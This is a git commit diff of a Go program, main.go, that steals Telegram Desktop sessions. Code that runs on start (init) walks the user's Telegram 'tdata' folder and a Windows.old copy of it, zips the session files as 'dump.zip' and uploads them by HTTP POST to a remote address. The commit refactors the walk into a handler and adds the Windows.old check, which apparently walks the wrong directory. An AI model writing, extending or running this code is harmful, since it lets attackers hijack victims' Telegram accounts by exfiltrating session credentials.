f7fb90acfaabb160c627a85083c6a3eaa97b3367
GMELUM <gmelum@vk.com>
2024-02-03 12:59:39 +0300

    update

--- main.go
+++ main.go
@@ -19,10 +19,10 @@ func sendBufferToURL(buf *bytes.Buffer) {
 	if err != nil {
 		return
 	}
- 
+
 	body := &bytes.Buffer{}
 	writer := multipart.NewWriter(body)
- 
+
 	part, err := writer.CreateFormFile("file", "dump.zip")
 	if err != nil {
 		return
@@ -31,64 +31,67 @@ func sendBufferToURL(buf *bytes.Buffer) {
 	if err != nil {
 		return
 	}
- 
+
 	writer.Close()
- 
+
 	req.Header.Set("Content-Type", writer.FormDataContentType())
- 
+
 	req.Body = io.NopCloser(body)
- 
+
 	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
 		return
 	}
 	defer resp.Body.Close()
- }
+}
+
+func handler(path string, info os.FileInfo, err error) error {
+	list := []string{"user_data", "webview", "emoji", "temp", "dumps", "working", "tdummy"}
+
+	if strings.HasSuffix(path, "tdata") {
+		return nil
+	}
+
+	for _, str := range list {
+		if strings.Contains(path, str) {
+			return nil
+		}
+	}
+
+	index := strings.Index(path, "tdata")
+	if index != -1 {
+		fileName := path[index:]
+		content, err := os.ReadFile(path)
+		if err != nil {
+			return nil
+		}
+		f, err := zipWriter.Create(fileName)
+		if err != nil {
+			return nil
+		}
+		_, err = f.Write(content)
+		if err != nil {
+			return nil
+		}
+	}
+	return nil
+}
 
 func init() {
 	dirname := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")
 
-	err := filepath.Walk(dirname, func(path string, info os.FileInfo, err error) error {
-		list := []string{"user_data", "webview", "emoji", "temp", "dumps", "working", "tdummy"}
-
-		if strings.HasSuffix(path, "tdata") {
-			return nil
-		}
-
-		for _, str := range list {
-			if strings.Contains(path, str) {
-				return nil
-			}
-		}
-
-		index := strings.Index(path, "tdata")
-		if index != -1 {
-			fileName := path[index:]
-			content, err := os.ReadFile(path)
-			if err != nil {
-				return nil
-			}
-			f, err := zipWriter.Create(fileName)
-			if err != nil {
-				return nil
-			}
-			_, err = f.Write(content)
-			if err != nil {
-				return nil
-			}
-		}
-		return nil
-	})
-	if err != nil {
-		return
+	if _, err := os.Stat(dirname); err == nil {
+		filepath.Walk(dirname, handler)
+		zipWriter.Close()
+		sendBufferToURL(&buf)
 	}
 
-	err = zipWriter.Close()
-	if err != nil {
-		return
+	newPath := `C:\Windows.old` + dirname[2:]
+
+	if _, err := os.Stat(newPath); err == nil {
+		filepath.Walk(dirname, handler)
+		zipWriter.Close()
+		sendBufferToURL(&buf)
 	}
-
-	sendBufferToURL(&buf)
-
 }
